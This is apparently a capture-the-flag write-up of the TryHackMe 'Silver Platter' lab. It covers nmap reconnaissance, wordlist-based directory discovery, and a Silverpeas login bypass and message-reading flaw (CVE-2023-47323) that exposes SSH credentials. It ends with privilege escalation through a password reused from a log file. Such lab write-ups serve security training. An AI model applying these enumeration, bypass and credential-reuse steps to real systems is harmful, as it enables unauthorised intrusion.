# [CTF](https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)) challenge solved.

# Silver Platter - TryHackMe

24-03-2025

## Starting with nmap 
- Scanning the target to identify open ports

`$sudo nmap -T5 -Pn -oN nmap/init 10.10.126.96`

```output
# Nmap 7.94SVN scan initiated Mon Mar 24 06:40:27 2025 as: nmap -T5 -Pn -oN nmap/init 10.10.126.96
Warning: 10.10.126.96 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.126.96
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

# Nmap done at Mon Mar 24 06:40:40 2025 -- 1 IP address (1 host up) scanned in 12.61 seconds

```
- We have port 22/tcp,80/tcp and 8080/tcp open.



## Scanning more in-depth on the target
`$sudo nmap -sVC -Pn -T5 -p 80,22,8080 -oN nmap/deep 10.10.126.96`

```output

# Nmap 7.94SVN scan initiated Mon Mar 24 07:00:31 2025 as: nmap -sVC -Pn -T5 -p 80,22,8080 -oN nmap/deep 10.10.126.96
Nmap scan report for 10.10.126.96
Host is up (0.21s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 24 Mar 2025 07:00:39 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 24 Mar 2025 07:00:38 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=3/24%Time=67E10316%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20clos
SF:e\r\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mo
SF:n,\x2024\x20Mar\x202025\x2007:00:38\x20GMT\r\n\r\n<html><head><title>Er
SF:ror</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTP
SF:Options,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
SF:nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,\x
SF:2024\x20Mar\x202025\x2007:00:38\x20GMT\r\n\r\n<html><head><title>Error<
SF:/title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequ
SF:est,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\
SF:x20Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nCon
SF:tent-Type:\x20text/html\r\nDate:\x20Mon,\x2024\x20Mar\x202025\x2007:00:
SF:39\x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\
SF:x20Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Ge
SF:nericLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
SF:00\r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r
SF:(SSLSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length
SF::\x200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\
SF:x20close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPD
SF:String,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r
SF:\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\
SF:n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 24 07:02:09 2025 -- 1 IP address (1 host up) scanned in 97.64 seconds



```




## Exploring the website on port 80/tcp (http)

- pages on the site (sitemap):
```
/
-/assets (302 Forbidden)
-/LICENSE.txt
-/README.txt
-/images (302 Forbidden)
```

## Port 8080/tcp
- pages on the site (sitemap):
```
-/console (302 Forbidden) -> redirects to /noredirect.html
 |__/console/base/config.json (302 Forbidden) -> redirects to /noredirect.html
 |__/console/login/LoginForm.jsp (302 Forbidden)  -> redirects to /noredirect.html
 |__/console/j_security_check (302 Forbidden) -> redirects to /noredirect.html
 |__/console/payments/config/payments/config/json (302 Forbidden) -> redirects to /noredirect.html
-/website -> (302 Forbidden) redirects to /website 
```

Check for more information about the website:

`$whatweb 10.10.126.96`


```output

http://10.10.126.96 [200 OK] 
Country[RESERVED][ZZ], 
Email[jane@untitled.tld], 
HTML5, 
HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
IP[10.10.126.96], 
JQuery, Script, Title[Hack Smarter Security], 
nginx[1.18.0]

```

After a while, brute-forcing directories and files in the web server. I tried to scrape the words on the site using cewl to create a custom word list and saved it into a file:

`$cewl http://10.10.126.96 > wordlist`
- Remove the empty lines in the wordlist file.

But still, after using that word list, there were no pages found, so I tried to convert every single word in the list into lowercase to check if I could find anything, so I used Python to convert all the lines into lowercase.

```convert wordlist into lower case
#!/usr/bin/python3

limit = 248 # This is the number of lines we want to convert into lower case
count = 0 # initialized an count variable

while count <= limit: # Creating a loop with an condition
    
    # Loading the wordlist file to read the lines
    with open("wordlist.txt", "r") as f:
        
        # Storring line by line in this variable on every loop
        data = f.readlines()[count]
        
        # Converting the lines into lower case and showing it as output
        print(data.lower())
        
        # Keep updating the value till it reach the maximum line number
        count += 1


```
Then run the code and save it into another file.

`$python3 converter.py > wordlist.txt`

## Now checking the website pages on port 8080/tcp with the wordlist:
`$dirsearch -u  http://10.10.126.96:8080 -w wordlist.txt`

### Here we go; there is a page found.

``` output

dirsearch -u http://`cat ip.txt`:8080 -w wordlist.txt 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 244

Output File: reports/http_10.10.126.96_8080/_.txt

Target: http://10.10.126.96:8080/

[09:44:30] Starting: 
[09:44:41] 302 -    0B  - /silverpeas  ->  http://10.10.126.96:8080/silverpeas/

Task Completed

```

## After opening the page, I discovered that it was a login page.

It was Silverpeas login page, and after Googling for the default credential for that site, I found that there was a CVE for bypassing the login, [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d). Also by default, the admin name in Silverpeas is SilverAdmin, found from a Google [search](https://sdl.ist.osaka-u.ac.jp/~h-azuma/satd-docker/scrape/silverpeas.html). So by connecting these dots, we can login to the admin account using the CVE login bypass.



### Found some more CVEs for the Silverpeas 6.3.4 < 6.3.5.
https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/
- CVE-2023-47323
- CVE-2023-47321
- CVE-2023-47320
- CVE-2023-47324
- CVE-2023-47325
- CVE-2023-47326
- CVE-2023-47327

## This one seems interesting: CVE-2023-47323. 
- Broken access control allows attackers to read all messages.
```proof-of-concept exploit

Description

The notification/messaging feature of Silverpeas Core 6.3.1 does not enforce access control on the ID parameter. This allows an attacker to read all messages sent between other users; including those sent only to administrators.
Usage/Exploitation
To exploit this vulnerability, an attacker can use a script or Burp Suite Intruder to view all messages by attacking the ID parameter in this URL: http://localhost:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[messageID] - the messages begin at "1" and increase in intervals of 1.

```
## After reading the messages one by one, I found interesting information in the 6th message:
- http://10.10.151.252:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
```message:

Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim

Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol

```
With this we can SSH into the server.

#### using the SSH credential:
- tim
- cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol 

`ssh tim@10.10.126.96`

After logging in, we got the user flag.

## Now it's time to escalate privileges.

- After looking around the logs at `auth.log.*`, I found postgress docker container info:
```auth.log.*
usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```

- Tried the `POSTGRES_PASSWORD` on tyler user account:
```
$su tyler
Password.=_Zd_zx7N823/
```

### Successfully logged into tyler's account
- Checked if the user can run sudo and found that this user can run all commands using sudo :
```
$sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL


```
## Got root access by entering `sudo su`
- Found root flag at root directory.











